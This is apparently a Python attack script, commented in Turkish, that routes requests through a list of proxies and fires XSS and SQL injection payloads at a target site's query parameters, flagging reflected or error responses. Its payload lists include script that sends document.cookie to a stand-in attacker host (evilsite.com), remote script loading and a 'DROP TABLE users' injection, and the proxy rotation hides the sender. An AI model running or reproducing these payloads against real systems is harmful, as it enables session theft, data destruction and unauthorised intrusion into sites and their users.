import requests

# Proxy list
with open('proxy.txt', 'r') as f:
    proxies = f.read().splitlines()
url = 'https://examplesite.com'

# XSS payload listesi
xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\');" />',
    '<body onload=alert("XSS")>',
    '<object data="javascript:alert(\'XSS\');" />',
    '<embed src="javascript:alert(\'XSS\');">',
    '<a href="javascript:alert(\'XSS\');">Click Me!</a>',
    '<img src="javascript:alert(\'XSS\')" />',
    '<input type="text" value="XSS" onfocus=alert("XSS")>',
    '<img src="x" onerror="javascript:alert(\'XSS\')" />',
    '<script>prompt(document.domain)</script>',
    '<marquee><h1><b><i>Test</i></b></h1></marquee><script>alert(1)</script>',
    '<script src="http://www.evilsite.com/malicious-code.js"></script>',
    '<img src=x onerror=window.location="http://www.evilsite.com?cookie="+document.cookie>',
    '<img src=x onerror=top.location="http://www.evilsite.com?cookie="+document.cookie>',
    '<svg/onload=alert(document.cookie)>',
    '<iframe/onload=alert(document.cookie)>',
    '<img/src/onerror=this.onerror=function(){return true;},alert(document.cookie);>',
    '<script>fetch("http://www.evilsite.com/log?key="+document.cookie)</script>',
    # ... diğer payloadlar
]

# SQL injection payload listesi
sql_payloads = [
    "'; DROP TABLE users; --",
    "1; SELECT * FROM users WHERE name = 'admin';",
    # ... diğer payloadlar
]

# Tüm proxy'ler üzerinde açıkları test et
for proxy in proxies:
    try:
        response = requests.get(url, proxies={'http': proxy, 'https': proxy}, timeout=5)
        print(f'Proxy: {proxy} - Status code: {response.status_code}')

        # XSS payloadları test et
        for payload in xss_payloads:
            xss_url = f"{url}?query={payload}"
            response = requests.get(xss_url, proxies={'http': proxy, 'https': proxy}, timeout=5)
            if payload in response.text:
                print(f'XSS açığı bulundu! - Payload: {payload} - URL: {xss_url}')

        # SQL injection payloadları test et
        for payload in sql_payloads:
            sql_url = f"{url}/search?query={payload}"
            response = requests.get(sql_url, proxies={'http': proxy, 'https': proxy}, timeout=5)
            if 'error' in response.text or 'syntax' in response.text:
                print(f'SQL injection açığı bulundu! - Payload: {payload} - URL: {sql_url}')
    except:
        print(f'Proxy: {proxy} - Bağlantı hatası!')
